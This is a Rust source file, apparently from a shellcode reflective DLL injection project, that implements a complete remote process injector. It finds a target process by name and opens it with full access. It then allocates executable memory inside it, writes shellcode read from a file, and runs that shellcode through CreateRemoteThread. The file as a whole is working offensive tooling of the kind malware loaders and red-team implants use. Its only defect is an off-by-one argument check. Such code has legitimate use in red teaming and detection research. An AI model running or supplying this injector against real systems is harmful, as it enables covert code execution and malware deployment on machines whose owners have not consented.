use std::{env, ptr::null_mut};
use sysinfo::{Pid, ProcessExt, SystemExt};
use windows_sys::Win32::{
    Foundation::CloseHandle,
    System::{
        Diagnostics::Debug::WriteProcessMemory,
        Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE},
        Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS},
    },
};

fn main() {
    env_logger::init();

    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("Usage: inject.exe <process> <shellcode.bin>");
        std::process::exit(1);
    }

    let process_name = &args[1];
    let file_path = &args[2];

    let process_id = get_process_id_by_name(process_name) as u32;
    log::debug!("[+] Process ID: {}", process_id);

    //let image_bytes = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\shellcode.bin");
    let image_bytes = std::fs::read(file_path).expect("Failed to read the file path");
    let module_size = image_bytes.len();
    let module_base = image_bytes.as_ptr();

    // Get a handle to the target process with PROCESS_ALL_ACCESS
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, process_id) };

    if process_handle == 0 {
        panic!("Failed to open a handle to the target process");
    }

    log::debug!("[+] Process handle: {:?}", process_handle);

    // Allocate memory in the target process for the shellcode
    let shellcode_address = unsafe {
        VirtualAllocEx(
            process_handle,
            null_mut(),
            module_size, // was sizeOfImage for RDI
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    log::debug!(
        "[+] Allocated memory in the target process for the shellcode: {:p}",
        shellcode_address
    );

    if shellcode_address.is_null() {
        panic!("Failed to allocate memory in the target process for the shellcode");
    }

    // Write the shellcode to the target process
    let wpm_result = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_address as _,
            module_base as _,
            module_size, // was sizeOfImage for RDI
            null_mut(),
        )
    };

    if wpm_result == 0 {
        panic!("Failed to write the image to the target process");
    }

    //For debugging
    //pause();

    // Create remote thread and execute our shellcode
    let thread_handle = unsafe {
        CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            Some(std::mem::transmute(shellcode_address as usize)),
            std::ptr::null_mut(), // Can be used to pass the first parameter to loader but we're using shellcode to call our loader with more parameters
            0,
            null_mut(),
        )
    };

    // Close thread and process handle
    unsafe {
        CloseHandle(thread_handle);
        CloseHandle(process_handle);
    };
}

/// Get process ID by name
pub fn get_process_id_by_name(target_process: &str) -> Pid {
    let mut system = sysinfo::System::new();
    system.refresh_all();

    let mut process_id = 0;

    for process in system.process_by_name(target_process) {
        process_id = process.pid();
    }
    return process_id;
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
